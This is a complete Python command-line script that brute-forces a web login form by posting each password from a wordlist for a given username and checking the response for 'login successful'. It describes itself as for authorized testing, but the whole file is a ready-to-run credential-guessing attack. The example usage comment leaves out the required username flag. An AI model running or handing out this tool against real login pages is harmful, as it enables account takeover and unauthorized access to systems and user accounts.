import requests

def brute_force_login(url, username, password_list):
    with open(password_list, 'r') as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        print(f"Trying password: {password}")
        response = requests.post(url, data={'username': username, 'password': password})
        
        if "login successful" in response.text.lower():  # Modify based on the app's response
            print(f"Success! Username: {username}, Password: {password}")
            return
    print("Brute force attempt completed. No matches found.")

# Example usage
# python brute.py -u http://example.com/login -P passwords.txt

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Brute force login page (authorized testing only)")
    parser.add_argument("-u", "--url", required=True, help="URL of the login page")
    parser.add_argument("-P", "--passwordlist", required=True, help="Path to password list")
    parser.add_argument("-U", "--username", required=True, help="Username to test")
    
    args = parser.parse_args()
    brute_force_login(args.url, args.username, args.passwordlist)
